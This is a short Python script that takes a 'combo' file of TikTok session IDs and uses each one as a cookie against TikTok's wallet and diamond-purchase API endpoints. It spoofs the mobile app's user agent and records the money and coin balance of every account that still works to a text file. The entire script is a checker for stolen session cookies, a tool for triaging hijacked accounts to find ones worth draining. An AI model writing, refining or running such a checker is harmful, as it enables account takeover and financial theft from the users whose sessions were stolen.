import json, requests

def check(ssid):
    response = requests.get("https://webcast16-va.tiktokv.com/webcast/wallet_api/withdrawal_page/?aid=1180", 
        headers={"Host": "webcast16-va.tiktokv.com", "accept-encoding": "gzip",  "sdk-version": "2", 
        "cookie": 'sessionid=%s' % ssid, "user-agent": "okhttp/3.10.0.1"}).json()

    response1 = requests.get('https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1180',
            headers={"Host": "webcast.tiktok.com", "accept-encoding": "gzip", "sdk-version": "2",  
            "cookie": 'sessionid=%s' % ssid,  "user-agent": "okhttp/3.10.0.1"})
    try:
        coins = json.loads(response1.text)['data']['coins']
        money = response['data']['user_money']['money']
        print(f'[{ssid}] Live balance: {money} Coin balance: {coins}')
        

        with open('money.txt', 'a+') as save:
            save.write(f'[{ssid}] | {money} Coin balance: {coins}\n')
            
    except Exception: print(f'[{ssid}] Error, probably bad ssid')

ssids = []
combo_file_path = input(' [Input] Drag your COMBO here: ').replace('"', '').replace("'", "").strip()
with open(combo_file_path, "r", encoding="utf8", errors="ignore") as file:
    ssids = list(set(file.read().splitlines()))

for ssid in ssids: check(ssid.strip())